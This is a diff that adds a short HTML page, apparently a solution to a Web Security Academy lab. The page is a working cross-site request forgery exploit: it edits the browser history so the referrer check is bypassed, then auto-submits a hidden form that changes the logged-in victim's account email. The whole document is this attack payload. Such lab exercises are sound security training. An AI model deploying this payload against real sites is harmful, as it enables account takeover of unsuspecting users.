@@ -1,0 +1,11 @@
+<html>
+    <head> Referrer-Policy: unsafe-url </head>
+    <body>
+        <script>history.pushState('','','/?0aaa0034033db63b82c22feb00cc00c9.web-security-academy.net')</script>   
+        <h1>Hello World!</h1>
+        <form action="https://0aaa0034033db63b82c22feb00cc00c9.web-security-academy.net/my-account/change-email" method="post" id="csrf-form"> 
+            <input type="hidden" name="email" value="hello@hello.com">
+        </form>
+        <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html>
